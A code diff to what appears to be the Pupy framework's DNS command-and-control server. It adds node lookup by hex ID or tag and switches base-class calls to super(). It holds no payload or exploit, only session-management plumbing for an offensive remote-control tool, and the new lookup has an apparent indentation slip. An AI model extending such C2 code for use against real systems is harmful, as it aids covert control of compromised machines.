@@ -117,6 +117,29 @@ class PupyDnsCommandServerHandler(DnsCommandServerHandler):
             session=node, default=default
         )
 
+    def find_nodes(self, node):
+        if not node:
+            return list(self.nodes.itervalues())
+
+        results = []
+
+        if type(node) in (str,unicode):
+            nodes = []
+
+            for n in node.split(','):
+                try:
+                    int(n, 16)
+                    nodes.append(n)
+                except:
+                    for tagged in self.config.by_tags(n):
+                        nodes.append(tagged)
+
+                    if nodes:
+                        results = super(PupyDnsCommandServerHandler, self).find_nodes(
+                            ','.join(nodes))
+
+        return results
+
     def find_sessions(self, spi=None, node=None):
         if spi or node:
             results = []
@@ -136,9 +159,8 @@ class PupyDnsCommandServerHandler(DnsCommandServerHandler):
                                     nodes.append(tagged)
 
                     if nodes:
-                        results = DnsCommandServerHandler.find_sessions(
-                            self, node=','.join(nodes)
-                        )
+                        results = super(PupyDnsCommandServerHandler, self).find_sessions(
+                            node=','.join(nodes))
                     else:
                         results = []
 
@@ -153,11 +175,10 @@ class PupyDnsCommandServerHandler(DnsCommandServerHandler):
                             pass
 
                     if spis:
-                        results += DnsCommandServerHandler.find_sessions(
-                            self, spi=','.join(spis)
-                        )
+                        results += super(PupyDnsCommandServerHandler, self).find_sessions(
+                            spi=','.join(spis))
         else:
-            results = DnsCommandServerHandler.find_sessions(self)
+            results = super(PupyDnsCommandServerHandler, self).find_sessions()
 
         return results
 
@@ -236,7 +257,7 @@ class PupyDnsCnc(object):
         return self.handler.find_sessions(node=node) \
           or self.handler.find_sessions(spi=node)
 
-    def nodes(self, node=None):
+    def nodes(self, node):
         return self.handler.find_nodes(node)
 
     def connect(self, host=None, port=None, transport=None, node=None, default=False):
